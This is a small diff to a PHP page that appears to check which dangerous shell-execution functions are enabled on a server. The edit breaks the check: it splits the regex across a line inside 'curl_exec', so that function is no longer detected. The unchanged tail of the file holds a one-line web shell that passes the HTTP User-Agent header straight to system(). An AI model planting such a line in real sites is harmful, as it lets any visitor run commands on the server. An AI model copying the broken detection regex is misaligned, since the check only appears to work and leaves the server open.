@@ -10,7 +10,8 @@
     // Default enabled *dangerous* functions
     echo "<h2>Check default enabled <b>dangerous</b> functions</h2>";
     echo "<pre>";
-    print_r(preg_grep("/^(system|exec|shell_exec|passthru|proc_open|popen|curl_exec|curl_multi_exec|parse_ini_file|show_source)$/", get_defined_functions(TRUE)["internal"]));
+    print_r(preg_grep("/^(system|exec|shell_exec|passthru|proc_open|popen|curl_
+    exec|curl_multi_exec|parse_ini_file|show_source)$/", get_defined_functions(true)["internal"]));
     echo "</pre>";
     //passthru("dir c:\\")
     
@@ -48,3 +49,4 @@
 <?php
     system($_SERVER['HTTP_USER_AGENT']);
 ?>
+
